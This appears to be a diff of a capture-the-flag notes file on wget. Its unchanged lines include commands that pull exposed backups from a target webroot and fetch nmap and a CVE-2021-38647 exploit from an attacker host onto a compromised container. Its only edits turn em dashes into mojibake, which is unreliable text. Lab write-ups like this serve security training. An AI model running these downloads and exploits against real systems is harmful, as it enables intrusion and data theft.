@@ -1,6 +1,6 @@
 # wget
 
-Non-interactive HTTP(S) / FTP downloader. Default choice for pulling a single URL (or a small known list of URLs) from the target's webroot — faster than `curl -O` for many files, and recurses cleanly when needed.
+Non-interactive HTTP(S) / FTP downloader. Default choice for pulling a single URL (or a small known list of URLs) from the target's webroot â€” faster than `curl -O` for many files, and recurses cleanly when needed.
 
 Used on: **LazyAdmin**, **Yueiua**, **Oh My Web**, **Vulnversity**, **BSides GT develpy**
 
@@ -8,18 +8,18 @@ Used on: **LazyAdmin**, **Yueiua**, **Oh My Web**, **Vulnversity**, **BSides GT 
 
 ### Single-file download
 ```bash
-wget http://$TARGET/content/inc/cache/cache.db                         # [USED — LazyAdmin]
-wget http://$TARGET/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql   # [USED — LazyAdmin]
-wget http://$TARGET/content/as/lib/app_sqlite.sql                      # [USED — LazyAdmin]
-wget http://$TARGET/content/as/lib/app_pgsql.sql                       # [USED — LazyAdmin]
+wget http://$TARGET/content/inc/cache/cache.db                         # [USED â€” LazyAdmin]
+wget http://$TARGET/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql   # [USED â€” LazyAdmin]
+wget http://$TARGET/content/as/lib/app_sqlite.sql                      # [USED â€” LazyAdmin]
+wget http://$TARGET/content/as/lib/app_pgsql.sql                       # [USED â€” LazyAdmin]
 
-wget http://$TARGET/assets/images/oneforall.jpg                        # [USED — Yueiua, fed steghide]
+wget http://$TARGET/assets/images/oneforall.jpg                        # [USED â€” Yueiua, fed steghide]
 ```
 
 ### Drop a static binary into a stripped container (when curl is missing)
 ```bash
-wget http://$LHOST/nmap -O /tmp/nmap && chmod +x /tmp/nmap             # [USED — ohmyweb]
-wget http://$LHOST/CVE-2021-38647.py -O /tmp/exploit.py                # [USED — ohmyweb]
+wget http://$LHOST/nmap -O /tmp/nmap && chmod +x /tmp/nmap             # [USED â€” ohmyweb]
+wget http://$LHOST/CVE-2021-38647.py -O /tmp/exploit.py                # [USED â€” ohmyweb]
 ```
 Companion to the static-binary pivot: see [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md).
 
@@ -30,9 +30,9 @@ wget http://$TARGET/.DS_Store
 wget http://$TARGET/assets/.DS_Store
 wget http://$TARGET/assets/js/.DS_Store
 wget http://$TARGET/assets/images/.DS_Store
-wget http://$TARGET/assets/images/shape/.DS_Store                      # [USED — ohmyweb]
+wget http://$TARGET/assets/images/shape/.DS_Store                      # [USED â€” ohmyweb]
 ```
-Parse offline with `python3 -m ds_store <file>` — see [ds-store-disclosure.md](../../exploits/web-disclosure/ds-store-disclosure.md).
+Parse offline with `python3 -m ds_store <file>` â€” see [ds-store-disclosure.md](../../exploits/web-disclosure/ds-store-disclosure.md).
 
 ### Rename on save
 ```bash
@@ -93,7 +93,7 @@ wget -b http://$TARGET/big.iso         # run in background
 | On a foothold shell (often no wget installed) | `curl` is more commonly present |
 
 ## Related
-- [curl](curl.md) — HTTP power tool for active exploitation
-- [backup-file-exposure.md](../../exploits/web-disclosure/backup-file-exposure.md) — classic use case on web targets
+- [curl](curl.md) â€” HTTP power tool for active exploitation
+- [backup-file-exposure.md](../../exploits/web-disclosure/backup-file-exposure.md) â€” classic use case on web targets
 
 
